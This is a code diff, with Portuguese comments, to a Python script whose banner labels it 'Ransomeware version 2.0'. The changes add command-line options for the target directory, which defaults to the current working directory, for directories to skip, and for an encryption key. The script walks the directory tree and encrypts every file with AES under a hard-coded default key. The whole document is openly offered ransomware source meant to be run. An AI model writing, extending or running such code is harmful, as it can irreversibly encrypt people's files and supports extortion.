@@ -1,5 +1,6 @@
 import os
 import pyaes
+import argparse
 
 # chave de criptografia
 chave = b"testeransomwares"  # Ajuste para 16, 24 ou 32 bytes
@@ -23,12 +24,11 @@ def listar_arquivos_diretorios(diretorio, diretorios_a_pular=None):
         diretorios_a_pular = []
 
     for root, dirs, files in os.walk(diretorio):
-       
-       # Verifica se o diretório deve ser pulado
+        # Verifica se o diretório deve ser pulado
         if any(nome in root for nome in diretorios_a_pular):
             continue
 
-         # Listar diretórios
+        # Listar diretórios
         print(f"Diretório: {root}")
 
         # Listar arquivos
@@ -36,8 +36,31 @@ def listar_arquivos_diretorios(diretorio, diretorios_a_pular=None):
             caminho_completo = os.path.join(root, file)
             criptografa(chave, caminho_completo)
             print(f"Arquivo criptografado: {caminho_completo}")
-#
-# Substitua '/caminho/do/seu/diretorio' pelo caminho real do diretório que você deseja começar
-caminho_do_diretorio = '/caminho/do/seu/diretorio'
-diretorios_a_pular = ['diretório', 'que será','desconsiderado']
-listar_arquivos_diretorios(caminho_do_diretorio, diretorios_a_pular)
+
+if __name__ == '__main__':
+
+    print('''
+    ============================================================
+	||                   Ransomeware                        ||
+	||                   version 2.0                        ||
+	||                                                      ||
+	|| python encrypter.py -d "caminho" -c "chavede16bytes" ||
+	=========================================================
+    
+
+        ''')
+
+    parser = argparse.ArgumentParser(description="Criptografa arquivos em um diretório, pulando diretórios específicos.")
+    parser.add_argument('-d', '--diretorio', type=str, help='Caminho do diretório a ser criptografado.', default=os.getcwd())
+    parser.add_argument('-p', '--pular', nargs='+', help='Lista de diretórios a serem pulados.')
+    parser.add_argument('-c', '--chave', type=str, help='Chave de criptografia.')
+
+    args = parser.parse_args()
+
+    caminho_do_diretorio = args.diretorio
+    diretorios_a_pular = args.pular if args.pular else []
+
+    if args.chave:
+        chave = args.chave.encode()
+
+    listar_arquivos_diretorios(caminho_do_diretorio, diretorios_a_pular)
